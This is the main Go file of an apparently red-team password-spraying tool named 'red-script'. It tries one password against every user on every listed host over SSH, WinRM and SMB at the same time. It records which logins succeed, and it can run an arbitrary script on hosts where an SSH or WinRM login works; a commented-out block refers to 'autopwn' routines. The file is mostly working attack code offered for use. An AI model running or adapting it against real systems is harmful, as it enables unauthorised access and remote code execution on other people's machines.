package main

import (
	"flag"
	"fmt"
	"os"
	"sync"

	"github.com/opt/red-script/internal/files"
	"github.com/opt/red-script/internal/smb"
	sshClient "github.com/opt/red-script/internal/ssh"
	"github.com/opt/red-script/internal/winrm"
	"github.com/spf13/viper"
)

var userPath, boxesPath, password, outputPath, scriptPath string
var configFile bool

func init() {
	flag.StringVar(&userPath, "u", "", "Path to file containing list of users.")
	flag.StringVar(&boxesPath, "b", "", "Path to file containing list of boxes.")
	flag.StringVar(&password, "p", "", "Password to attempt on users and boxes.")
	flag.StringVar(&outputPath, "o", "output.txt", "Output file name for successful responses.")
	flag.StringVar(&scriptPath, "s", "", "Path to a script that should be executed on successful SSH/WinRM logon. If this option is not set, a script will not be executed.")
	flag.BoolVar(&configFile, "c", false, "Boolean to use config file.")

	flag.Parse()
}

func main() {
	if configFile == false && (len(userPath) == 0 || len(boxesPath) == 0 || len(password) == 0) {
		os.Stderr.WriteString("ERROR: Config file or arguments userPath, boxPath, and/or password not specified.\n")
		flag.CommandLine.PrintDefaults()
		return
	}
	var pUsers *[]string
	var pBoxes *[]string
	var users []string
	var boxes []string

	if configFile == true {
		v := viper.New()
		v.SetConfigFile("config/config.yml")
		v.SetConfigType("yaml")
		err := v.ReadInConfig()
		if err != nil {
			panic(fmt.Errorf("Fatal error config file: %w \n", err))
		}

		users = v.GetStringSlice("userPath")
		boxes = v.GetStringSlice("boxesPath")
	} else {
		users, _ = files.ReadList(userPath)
		boxes, _ = files.ReadList(boxesPath)
	}

	pUsers = &users
	pBoxes = &boxes

	go files.InitWriter(outputPath)

	fmt.Printf("\nLoaded %d users and %d boxes\n", len(*pUsers), len(*pBoxes))

	var wg sync.WaitGroup
	for _, b := range *pBoxes {
		for _, u := range *pUsers {
			wg.Add(3)
			go sshClient.Connect(b, u, password, scriptPath, &wg)
			go winrm.Connect(b, u, password, scriptPath, &wg)
			go smb.Connect(b, u, password, &wg)
		}
	}
	wg.Wait()
	// for _, b := range boxes {
	// 	for _, u := range users {
	// 		autopwn.SSHAutopwn(b, u, password, scriptPath)
	// 		autopwn.WinRMAutopwn(b, u, password, scriptPath)
	// 	}
	// }

	fmt.Printf("Successfully checked %d entries, %d successful\n", len(*pBoxes)*len(*pUsers), files.TotalWrites)
}

func GetScriptPath() string {
	return scriptPath
}
